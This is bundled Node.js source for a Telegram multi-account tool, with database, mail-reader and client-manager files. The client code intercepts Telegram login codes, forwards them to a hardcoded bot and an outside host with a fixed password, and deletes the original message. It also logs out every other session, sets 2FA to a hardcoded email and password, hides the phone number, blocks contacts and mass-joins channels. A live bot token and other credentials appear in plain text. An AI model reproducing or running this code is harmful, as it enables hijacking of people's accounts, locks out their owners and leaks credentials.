this.client.db(\"tgclients\").collection('clients');\r\n        const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });\r\n        return updatedDocument.value;\r\n    }\r\n\r\n    async insertInAchivedClient(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('ArchivedClients');\r\n        const upiIds = await upiDb.updateOne({ number: data.number }, { $set: { ...data } }, { upsert: true });\r\n        return upiIds\r\n    }\r\n\r\n    async getInAchivedClient(filter) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('ArchivedClients');\r\n        const upiIds = await upiDb.findOne(filter)\r\n        return upiIds\r\n    }\r\n\r\n    async removeOneAchivedClient(filter) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('ArchivedClients');\r\n        const upiIds = await upiDb.deleteOne(filter)\r\n        return upiIds\r\n    }\r\n\r\n    async getAllUserClients() {\r\n        const clientDb = this.client.db(\"tgclients\").collection('clients');\r\n        const clients = await clientDb.aggregate([\r\n            {\r\n                $project: {\r\n                    \"_id\": 0,\r\n                    \"session\": 0,\r\n                    \"number\": 0,\r\n                    \"password\": 0,\r\n                }\r\n            }\r\n        ]).toArray();\r\n        return clients;\r\n    }\r\n\r\n    async getTgConfig() {\r\n        const clientDb = this.client.db(\"tgclients\").collection('configuration');\r\n        const client = await clientDb.findOne({ \"apiId\": \"1591339\" });\r\n        return client\r\n    }\r\n\r\n    async updateTgConfig(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('configurations');\r\n        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });\r\n        return upiIds\r\n    }\r\n\r\n    async processUsers(limit = undefined, skip = undefined) {\r\n        const weekAgo = new Date(Date.now() - (60 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0]\r\n        const cursor = this.users.find({\r\n            $or: [\r\n                { \"lastUpdated\": { $lt: weekAgo } },\r\n                { \"lastUpdated\": { $exists: false } }\r\n            ]\r\n        }).limit(limit ? limit : 300).skip(skip ? skip : 0);\r\n        return cursor;\r\n    }\r\n\r\n    async clearStats() {\r\n        const result = await this.statsDb.deleteMany({ \"payAmount\": { $lt: 5 } });\r\n        console.log(result);\r\n    }\r\n\r\n    async clearStats2() {\r\n        const result = await this.statsDb2?.deleteMany({});\r\n        console.log(result);\r\n    }\r\n\r\n    async reinitPromoteStats() {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const users = await this.getAllUserClients();\r\n        for (const user of users) {\r\n            await promotColl.updateOne({ client: user.clientId },\r\n                {\r\n                    $set: {\r\n                        data: Object.fromEntries((await promotColl.findOne({ client: user.clientId })).channels?.map(channel => [channel, 0])),\r\n                        totalCount: 0,\r\n                        uniqueChannels: 0,\r\n                        releaseDay: Date.now(),\r\n                        lastupdatedTimeStamp: Date.now()\r\n                    }\r\n                });\r\n        }\r\n    }\r\n\r\n    async closeConnection() {\r\n        try {\r\n            if (this.isConnected) {\r\n                this.isConnected = false;\r\n                console.log('MongoDB connection closed.');\r\n            }\r\n            await this.client?.close();\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getCurrentActiveUniqueChannels() {\r\n        const promoteStatsColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n\r\n        const cursor = promoteStatsColl.find({});\r\n        const uniqueChannels = new Set();\r\n\r\n        await cursor.forEach((document) => {\r\n            for (const channel in document.data) {\r\n                uniqueChannels.add(channel);\r\n            }\r\n        });\r\n\r\n        const uniqueChannelNames = Array.from(uniqueChannels);\r\n        return uniqueChannelNames;\r\n    }\r\n\r\n    async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {\r\n        const pattern = new RegExp(keywords.join('|'), 'i');\r\n        const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\r\n        let query = {\r\n            $and: [\r\n                { username: { $ne: null } },\r\n                {\r\n                    $or: [\r\n                        { title: { $regex: pattern } },\r\n                        { username: { $regex: pattern } }\r\n                    ]\r\n                },\r\n                {\r\n                    username: {\r\n                        $not: {\r\n                            $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\r\n                        }\r\n                    }\r\n                },\r\n                {\r\n                    title: { $not: { $regex: notPattern } }\r\n                },\r\n                {\r\n                    username: { $not: { $regex: notPattern } }\r\n                },\r\n                {\r\n                    sendMessages: false,\r\n                    broadcast: false,\r\n                    restricted: false\r\n                }\r\n            ]\r\n        };\r\n\r\n        const sort = { participantsCount: -1 };\r\n        const promoteStatsColl = this.client.db(\"tgclients\").collection(collection);\r\n        try {\r\n            const result = await promoteStatsColl\r\n                .find(query)\r\n                .sort(sort)\r\n                .skip(skip)\r\n                .limit(limit)\r\n                .toArray();\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            return [];\r\n        }\r\n    }\r\n\r\n    async updateActiveChannels() {\r\n        try {\r\n            const promoteStatsColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n            const activeChannelCollection = this.client.db(\"tgclients\").collection('activeChannels');\r\n            const channelInfoCollection = this.client.db(\"tgclients\").collection('channels');\r\n            const cursor = promoteStatsColl.find({});\r\n\r\n            await cursor.forEach(async (document) => {\r\n                for (const channelId in document.data) {\r\n                    const channelInfo = await channelInfoCollection.findOne({ channelId }, { projection: { \"_id\": 0 } });\r\n                    if (channelInfo) {\r\n                        await activeChannelCollection.updateOne({ channelId }, { $set: channelInfo }, { upsert: true });\r\n                    }\r\n                }\r\n            });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async updateActiveChannel(id, data) {\r\n        const activeChannelCollection = this.client.db(\"tgclients\").collection('activeChannels');\r\n        await activeChannelCollection.updateOne({ channelId: id }, { $set: data }, { upsert: true })\r\n    }\r\n\r\n    async removeOnefromActiveChannel(filter) {\r\n        try {\r\n            const activeChannelCollection = this.client.db(\"tgclients\").collection('activeChannels');\r\n            await activeChannelCollection.deleteOne(filter)\r\n        } catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n}\r\n\r\nmodule.exports = ChannelService;","const Imap = require('imap');\r\nconsole.log(\"Started Mail Reader\")\r\nlet isReady = false;\r\n\r\nfunction isMailReady() {\r\n    return isReady;\r\n}\r\n\r\nconst imap = new Imap({\r\n    user: process.env.GMAIL_ADD,\r\n    password: process.env.GMAIL_PASS,\r\n    host: 'imap.gmail.com',\r\n    port: 993,\r\n    tls: true,\r\n    tlsOptions: {\r\n        rejectUnauthorized: false\r\n    }\r\n\r\n});\r\n\r\nasync function openInbox(cb) {\r\n    imap.openBox('INBOX', false, cb);\r\n}\r\n\r\nimap.once('ready', function () {\r\n    console.log(\"ready\")\r\n    isReady = true;\r\n    return true\r\n});\r\n\r\nimap.once('error', (err) => {\r\n    console.error(\"SomeError :\", err);\r\n});\r\n\r\nimap.once('end', () => {\r\n    console.log('Connection ended');\r\n});\r\nlet result = ''\r\nasync function getcode() {\r\n    await openInbox(() => {\r\n        const searchCriteria = [['FROM', 'noreply@telegram.org']];\r\n        const fetchOptions = {\r\n            bodies: ['HEADER', 'TEXT'],\r\n            markSeen: true,\r\n        };\r\n        imap.search(searchCriteria, (err, results) => {\r\n            if (err) throw err;\r\n            console.log(results)\r\n            if (results.length > 0) {\r\n                const fetch = imap.fetch([results[results.length - 1]], fetchOptions);\r\n                fetch.on('message', (msg, seqno) => {\r\n                    const emailData = [];\r\n\r\n                    msg.on('body', (stream, info) => {\r\n                        let buffer = '';\r\n\r\n                        stream.on('data', (chunk) => {\r\n                            buffer += chunk.toString('utf8');\r\n                        });\r\n\r\n                        stream.on('end', () => {\r\n                            if (info.which === 'TEXT') {\r\n                                emailData.push(buffer);\r\n                            }\r\n                            imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\r\n                                if (err) throw err;\r\n                                imap.expunge((err) => {\r\n                                    if (err) throw err;\r\n                                    console.log(`Deleted message`);\r\n                                });\r\n                            });\r\n                        });\r\n                    });\r\n\r\n                    msg.once('end', () => {\r\n                        console.log(`Email #${seqno}, Latest${results[results.length - 1]}`);\r\n                        console.log(\"EmailDataLength: \", emailData.length);\r\n                        console.log(\"Mail:\", emailData[emailData.length - 1].split('.'));\r\n                        result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0])\r\n                    });\r\n                });\r\n                fetch.once('end', () => {\r\n                    console.log(\"fetched mails\")\r\n                });\r\n            }\r\n        });\r\n    });\r\n    console.log(\"Returning from mail Reader:\", result);\r\n    if (result.length > 4) {\r\n        imap.end();\r\n    }\r\n    return result\r\n}\r\n\r\nfunction fetchNumbersFromString(inputString) {\r\n    const regex = /\\d+/g;\r\n    const matches = inputString.match(regex);\r\n    if (matches) {\r\n        const result = matches.join('');\r\n        return result;\r\n    } else {\r\n        return '';\r\n    }\r\n}\r\nfunction connectToMail() {\r\n    result = '';\r\n    imap.connect();\r\n}\r\nfunction disconnectfromMail() {\r\n    result = '';\r\n    imap.end();\r\n}\r\nmodule.exports = { getcode, isMailReady, connectToMail, disconnectfromMail }\r\n","const swaggerJsdoc = require('swagger-jsdoc');\r\n\r\nconst options = {\r\n  definition: {\r\n    openapi: '3.0.0',\r\n    info: {\r\n      title: 'ReddyGirl',\r\n      version: '1.0.0',\r\n      description: 'API documentation for your Express application',\r\n    },\r\n  },\r\n  apis: ['./index.js'], \r\n};\r\n\r\nconst swaggerSpec = swaggerJsdoc(options);\r\n\r\nmodule.exports = swaggerSpec;\r\n","const { TelegramClient, Api } = require('telegram');\r\nconst { NewMessage } = require(\"telegram/events/index.js\");\r\nconst axios = require('axios');\r\nconst { StringSession } = require('telegram/sessions');\r\nconst { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')\r\nconst ppplbot = \"https://api.telegram.org/bot6877935636:AAGsHAU-O2B2klPMwDrr0PfkBHXib74K1Nc/sendMessage\";\r\nconst { CustomFile } = require(\"telegram/client/uploads\");\r\nconst { sleep } = require('./utils')\r\nconst fs = require('fs');\r\nconst ChannelService = require('./dbservice');\r\n\r\nconst clients = new Map();\r\n\r\nlet activeClientSetup = undefined\r\nfunction getActiveClientSetup() {\r\n    return activeClientSetup;\r\n}\r\n\r\nfunction setActiveClientSetup(data) {\r\n    activeClientSetup = data\r\n}\r\n\r\nfunction getClient(number) {\r\n    return clients.get(number);\r\n}\r\n\r\nfunction hasClient(number) {\r\n    return clients.has(number);\r\n}\r\n\r\nasync function deleteClient(number) {\r\n    const cli = getClient(number);\r\n    await cli?.disconnect();\r\n    return clients.delete(number);\r\n}\r\n\r\nasync function disconnectAll() {\r\n    const data = clients.entries();\r\n    console.log(\"Disconnecting All Clients\");\r\n    for (const [phoneNumber, client] of data) {\r\n        try {\r\n            await client?.disconnect();\r\n            clients.delete(phoneNumber);\r\n            console.log(`Client disconnected: ${phoneNumber}`);\r\n        } catch (error) {\r\n            console.log(error);\r\n            console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nasync function createClient(number, session, autoDisconnect = true) {\r\n    if (!clients.has(number)) {\r\n        return new Promise(async (resolve) => {\r\n            const cli = new TelegramManager(session, number);\r\n            await cli.createClient(autoDisconnect);\r\n            if (cli.expired) {\r\n                clients.set(number, cli);\r\n            }\r\n            resolve(cli.expired);\r\n        });\r\n    } else {\r\n        return { msgs: 10, total: 10 }\r\n    }\r\n}\r\n\r\n\r\nclass TelegramManager {\r\n    constructor(sessionString, phoneNumber) {\r\n        this.session = new StringSession(sessionString);\r\n        this.phoneNumber = phoneNumber;\r\n        this.client = null;\r\n        this.expired = false;\r\n        this.channelArray = []\r\n    }\r\n\r\n    async disconnect() {\r\n        await this.client.disconnect();\r\n        await this.client.destroy();\r\n        this.session.delete();\r\n    }\r\n\r\n    async createClient(autoDisconnect = true) {\r\n        try {\r\n            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\r\n                connectionRetries: 5,\r\n            });\r\n            console.log(\"Stating Client - \", this.phoneNumber)\r\n            await this.client.connect();\r\n            // const msg = await this.client.sendMessage(\"777000\", { message: \".\" });\r\n            // await msg.delete({ revoke: true });\r\n            const myMsgs = await this.client.getMessages('me', { limit: 8 });\r\n            if (autoDisconnect) {\r\n                setTimeout(async () => {\r\n                    if (this.client.connected || clients.get(this.phoneNumber)) {\r\n                        console.log(\"SELF destroy client\");\r\n                        await this.client.disconnect();\r\n                        await this.client.destroy();\r\n                        this.session.delete();\r\n                    } else {\r\n                        console.log(\"Client Already Disconnected\");\r\n                    }\r\n                    clients.delete(this.phoneNumber);\r\n                }, 180000)\r\n            } else {\r\n                const id = setInterval(async () => {\r\n                    if (!this.client.connected || !clients.has(this.phoneNumber)) {\r\n                        clearInterval(id);\r\n                    }\r\n                    await this.client.connect();\r\n                }, 20000);\r\n            }\r\n            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());\r\n            console.log(\"Added event handler\");\r\n            const chats = await this.client?.getDialogs({ limit: 500 });\r\n            console.log(\"TotalChats:\", chats['total'])\r\n            this.expired = { msgs: myMsgs['total'], total: chats['total'] }\r\n        } catch (error) {\r\n            console.log(error);\r\n            this.expired = undefined;\r\n        }\r\n    }\r\n\r\n    async getLastMsgs(limit) {\r\n        const msgs = await this.client.getMessages(\"777000\", { limit: parseInt(limit) });\r\n        let resp = ''\r\n        msgs.forEach((msg) => {\r\n            console.log(msg.text);\r\n            resp = resp + msg.text + \"\\n\"\r\n        })\r\n        return (resp)\r\n    }\r\n    async channelInfo(sendIds = false) {\r\n        const chats = await this.client?.getDialogs({ limit: 600 });\r\n        let canSendTrueCount = 0;\r\n        let canSendFalseCount = 0;\r\n        let totalCount = 0\r\n        this.channelArray.length = 0;\r\n        console.log(chats[\"total\"]);\r\n        chats.map(async (chat) => {\r\n            if (chat.isChannel || chat.isGroup) {\r\n                try {\r\n                    const chatEntity = await chat.entity.toJSON();\r\n                    const { broadcast, defaultBannedRights } = chatEntity;\r\n                    totalCount++;\r\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\r\n                        canSendTrueCount++;\r\n                        this.channelArray.push(chatEntity.username);\r\n                    } else {\r\n                        canSendFalseCount++;\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error)\r\n                }\r\n            }\r\n        });\r\n        const responseObj = {\r\n            chatsArrayLength: totalCount,\r\n            canSendTrueCount,\r\n            canSendFalseCount,\r\n            ids: sendIds ? this.channelArray : []\r\n        };\r\n        return responseObj\r\n    }\r\n\r\n    async joinChannels(str) {\r\n        const db = ChannelService.getInstance();\r\n        const channels = str.split('|');\r\n        console.log(this.phoneNumber, \" - channelsLen - \", channels.length)\r\n        for (let i = 0; i < channels.length; i++) {\r\n            if (!this.client.connected || !clients.has(this.phoneNumber)) {\r\n                break;\r\n            }\r\n            const channel = channels[i].trim();\r\n            console.log(this.phoneNumber, \"Trying: \", channel)\r\n            try {\r\n                let joinResult = await this.client.invoke(\r\n                    new Api.channels.JoinChannel({\r\n                        channel: await this.client.getEntity(channel)\r\n                    })\r\n                );\r\n                console.log(this.phoneNumber, \" - Joined channel Sucesss - \", channel)\r\n                try {\r\n                    const chatEntity = await this.client.getEntity(channel)\r\n                    const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;\r\n                    const entity = {\r\n                        id: id.toString(),\r\n                        title,\r\n                        participantsCount,\r\n                        username,\r\n                        restricted,\r\n                        broadcast,\r\n                        sendMessages: defaultBannedRights?.sendMessages,\r\n                        canSendMsgs: false,\r\n                    };\r\n                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {\r\n                        entity.canSendMsgs = true;\r\n                        try {\r\n                            await db.updateActiveChannel(entity.id.toString(), entity);\r\n                            console.log(\"updated ActiveChannels\");\r\n                        } catch (error) {\r\n                            console.log(error);\r\n                            console.log(\"Failed to update ActiveChannels\");\r\n                        }\r\n                    } else {\r\n                        await db.removeOnefromActiveChannel({ channelId: entity.id.toString() });\r\n                        await db.removeOnefromChannel({ channelId: entity.id.toString() });\r\n                        console.log(\"Removed Cahnnel- \", channel)\r\n                    }\r\n                } catch (error) {\r\n                    console.log(this.phoneNumber, \" - Failed - \", error)\r\n                }\r\n            } catch (error) {\r\n                console.log(\"Channels ERR: \", error);\r\n                if (error.toString().includes(\"No user has\") || error.toString().includes(\"USERNAME_INVALID\")) {\r\n                    await db.removeOnefromActiveChannel({ username: channel.replace(\"@\", '') });\r\n                    await db.removeOnefromChannel({ username: channel });\r\n                    console.log(\"Removed Cahnnel- \", channel)\r\n                }\r\n                if (error.errorMessage === 'CHANNELS_TOO_MUCH' || error.errorMessage == \"FLOOD\") {\r\n                    await deleteClient(this.phoneNumber);\r\n                    break;\r\n                }\r\n            }\r\n            console.log(this.phoneNumber, \" - On waiting period\")\r\n            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));\r\n            console.log(this.phoneNumber, \" - Will Try next\")\r\n        }\r\n        console.log(this.phoneNumber, \" - finished joining channels\")\r\n        await this.client.disconnect();\r\n        await deleteClient(this.phoneNumber);\r\n    }\r\n\r\n    async deleteChat(chatId) {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.messages.DeleteChat({\r\n                    chatId: chatId,\r\n                })\r\n            );\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n    async removeOtherAuths() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        const updatedAuthorizations = result.authorizations.map((auth) => {\r\n            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\r\n                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\r\n                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\r\n                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')\r\n                || auth.deviceModel.toLowerCase().includes('windows')) {\r\n                return auth;\r\n            } else {\r\n                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\r\n                return null;\r\n            }\r\n        }).filter(Boolean);\r\n        console.log(updatedAuthorizations);\r\n    }\r\n\r\n    async getAuths() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        return result\r\n    }\r\n\r\n    async hasPassword() {\r\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\r\n        return passwordInfo.hasPassword\r\n    }\r\n\r\n    async blockAllUsers() {\r\n        const chats = await this.client?.getDialogs({ limit: 600 });\r\n        for (let chat of chats) {\r\n            if (chat.isUser) {\r\n                await this.blockAUser(chat.id)\r\n            }\r\n            sleep(5000);\r\n        }\r\n    }\r\n\r\n    async blockAUser(id) {\r\n        const result = await this.client.invoke(\r\n            new Api.contacts.Block({\r\n                id: id,\r\n            })\r\n        );\r\n    }\r\n\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!auth.country.toLowerCase().includes('singapore')) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        })\r\n        return latest\r\n    }\r\n\r\n    async getMe() {\r\n        const me = await this.client.getMe();\r\n        return me\r\n    }\r\n\r\n    async deleteProfilePhotos() {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: \"me\"\r\n                })\r\n            );\r\n            console.log(result)\r\n            if (result && result.photos?.length > 0) {\r\n                const res = await this.client.invoke(\r\n                    new Api.photos.DeletePhotos({\r\n                        id: result.photos\r\n                    }))\r\n            }\r\n            console.log(\"Deleted profile Photos\");\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async set2fa() {\r\n        connectToMail()\r\n        const intervalParentId = setInterval(async () => {\r\n            const isReady = isMailReady();\r\n            if (isReady) {\r\n                clearInterval(intervalParentId);\r\n                await this.client.updateTwoFaSettings({\r\n                    isCheckPassword: false,\r\n                    email: \"storeslaksmi@gmail.com\",\r\n                    hint: \"password - India143\",\r\n                    newPassword: \"Ajtdmwajt1@\",\r\n                    emailCodeCallback: async (length) => {\r\n                        console.log(\"code sent\");\r\n                        return new Promise(async (resolve) => {\r\n                            let retry = 0\r\n                            const intervalId = setInterval(async () => {\r\n                                console.log(\"checking code\");\r\n                                retry++\r\n                                const isReady = isMailReady();\r\n                                if (isReady && retry < 4) {\r\n                                    const code = await getcode();\r\n                                    if (code !== '') {\r\n                                        clearInterval(intervalId);\r\n                                        disconnectfromMail()\r\n                                        resolve(code);\r\n                                    }\r\n                                } else {\r\n                                    clearInterval(intervalId);\r\n                                    await this.client.disconnect();\r\n                                    await deleteClient(this.phoneNumber);\r\n                                    disconnectfromMail()\r\n                                    resolve(code);\r\n                                }\r\n                            }, 6000);\r\n                        });\r\n                    },\r\n                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve(\"error\") }\r\n                })\r\n            }\r\n        }, 5000);\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n        }\r\n        catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n    async updateProfile(firstName, about) {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.account.UpdateProfile({\r\n                    firstName: firstName,\r\n                    lastName: \"\",\r\n                    about: about,\r\n                })\r\n            );\r\n            console.log(\"Updated NAme: \", firstName);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n    async updateUsername(baseUsername) {\r\n        let newUserName = ''\r\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\r\n        let increment = 0;\r\n        if (username === '') {\r\n            try {\r\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                console.log(`Removed Username successfully.`);\r\n            } catch (error) {\r\n                console.log(error)\r\n            }\r\n        } else {\r\n            while (true) {\r\n                try {\r\n                    const result = await this.client.invoke(\r\n                        new Api.account.CheckUsername({ username })\r\n                    );\r\n                    console.log(result, \" - \", username)\r\n                    if (result) {\r\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                        console.log(`Username '${username}' updated successfully.`);\r\n                        newUserName = username\r\n                        break;\r\n                    } else {\r\n                        username = baseUsername + increment;\r\n                        increment++;\r\n                        await sleep(4000);\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error.message)\r\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\r\n                        newUserName = username;\r\n                        break;\r\n                    }\r\n                    username = baseUsername + increment;\r\n                    increment++;\r\n                }\r\n            }\r\n        }\r\n        return newUserName;\r\n    }\r\n\r\n    async updateProfilePic(image) {\r\n        try {\r\n            const file = await this.client.uploadFile({\r\n                file: new CustomFile(\r\n                    'pic.jpg',\r\n                    fs.statSync(\r\n                        image\r\n                    ).size,\r\n                    image\r\n                ),\r\n                workers: 1,\r\n            });\r\n            console.log(\"file uploaded- \", file)\r\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\r\n                file: file,\r\n            }));\r\n            console.log(\"profile pic updated\")\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async updatePrivacy() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n        }\r\n        catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n    async handleEvents(event) {\r\n        if (event.isPrivate) {\r\n            console.log(\"Message Recieved from - \", event.message.chatId.toString(), \": \", event.message.text)\r\n            if (event.message.chatId.toString() == \"777000\") {\r\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nSetup - ', activeClientSetup);\r\n                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {\r\n                    console.log(\"LoginText: \", event.message.text)\r\n                    const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\r\n                    console.log(\"Code is:\", code)\r\n                    try {\r\n                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\r\n                        console.log(\"Code Sent\");\r\n                    } catch (error) {\r\n                        console.log(error)\r\n                    }\r\n                    await deleteClient(this.phoneNumber)\r\n                }\r\n                console.log(event.message.text.toLowerCase());\r\n                const payload = {\r\n                    \"chat_id\": \"-1001801844217\",\r\n                    \"text\": event.message.text\r\n                };\r\n                axios.post(ppplbot, payload)\r\n                    .then((response) => {\r\n                    })\r\n                    .catch((error) => {\r\n                        console.error('Error sending message:', error.response?.data?.description);\r\n                    });\r\n                await event.message.delete({ revoke: true });\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nmodule.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient, getActiveClientSetup, setActiveClientSetup }\r\n","const axios = require('axios');\r\nfunction sleep(ms) {\r\n  return new Promise(resolve => setTimeout(resolve, ms));\r\n}\r\n\r\nasync function fetchWithTimeout(resource, options = {}, maxRetries = 3) {\r\n  const timeout = options?.timeout || 15000;\r\n\r\n  const source = axios.CancelToken.source();\r\n  const id = setTimeout(() => source.cancel(), timeout);\r\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\r\n    try {\r\n      const response = await axios({\r\n        ...options,\r\n        url: resource,\r\n        cancelToken: source.token\r\n      });\r\n      clearTimeout(id);\r\n      return response;\r\n    } catch (error) {\r\n      if (axios.isCancel(error)) {\r\n        console.log('Request canceled:', error.message, resource);\r\n      } else {\r\n        console.log('Error:', error.message);\r\n      }\r\n      if (retryCount < maxRetries) {\r\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 1 second delay\r\n      } else {\r\n        console.error(`All ${maxRetries + 1} retries failed for ${resource}`);\r\n        return undefined;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nmodule.exports = { sleep, fetchWithTimeout }","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","'use strict';\r\nconst dotenv = require('dotenv')\r\ndotenv.config();\r\nconst express = require('express');\r\nconst axios = require('axios');\r\nconst schedule = require('node-schedule-tz');\r\nconst timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };\r\nconst ChannelService = 